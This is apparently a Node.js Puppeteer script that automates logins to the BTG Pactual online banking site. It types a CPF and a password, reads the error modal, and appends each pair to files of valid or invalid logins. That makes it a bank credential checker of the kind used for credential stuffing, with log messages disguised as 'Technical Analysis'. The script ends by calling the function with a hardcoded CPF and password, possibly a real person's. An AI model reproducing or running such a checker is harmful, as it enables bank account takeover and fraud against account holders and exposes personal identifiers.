const  puppeteer = require("puppeteer");
const fs = require("fs");
function CheckDB(){
    return "AG";
}
function Api(cpf,senha){
    (async () => {
      try{ 
        console.log(`Inicializando com Sucesso ✅  [ SPX ] [ ID: ] [ Technical Analysis [ SPX ] ]`);
        const browser = await puppeteer.launch({headless: false, args: ['--no-sandbox']});
        const page = await browser.newPage();
        await page.setViewport({ width: 1366, height: 768});
        console.log(`Processando com Sucesso ✅  [ SPX ] [ ID: ] [ Technical Analysis [ SPX ] ]`);
        await page.goto('https://app.banking.btgpactual.com/login', {waitUntil: 'load', timeout: 0});
        await new Promise(r => setTimeout(r, 10000));
        let GetItem = await page.$x(`//*[@id="0cpf"]`)
        await GetItem[0].type(cpf);
        GetItem = await page.$x(`//*[@id="1senha"]`)
        await GetItem[0].type(senha);
        GetItem = await page.$x(`//*[@id="login-container"]/form/btg-button[1]/button`)
        await GetItem[0].click();
        try{
          await new Promise(r => setTimeout(r, 2000));
          const text = await page.evaluate(() => Array.from(document.querySelectorAll('[class="modal-error"]'), element => element.textContent));
          const Checks = text[0]===" Ops! Nosso sistema está em ajustes para melhorar sua experiência conosco. Pode voltar daqui a pouco? ";
          if(Checks){
            console.log(`Login invalido. [ ${cpf} | ${senha} ]`);
            fs.writeFileSync(`login_invalido.txt`, `${cpf}|${senha}\n`,{ flag: "a+" });
          }else{
            console.log(`Login com sucesso. [ ${cpf} | ${senha} ]`);
            fs.writeFileSync(`login_sucesso.txt`, `${cpf}|${senha}\n`,{ flag: "a+" });

          }
        }catch{
          console.log("ERRO NO NAVEGADOR....");
        }
      }catch(error){
        console.log(`Erro no PDF ❌ [ SPX ] [ ID: ] [ ERRO Technical Analysis [ SPX ] ]`);
      }finally{
        console.log(`[ REQUEST ✅  ] [ SPX ] [ ID: ] [ Technical Analysis [ SPX ] ]`);
      }
    })();
  };
Api("07016923320","36925147");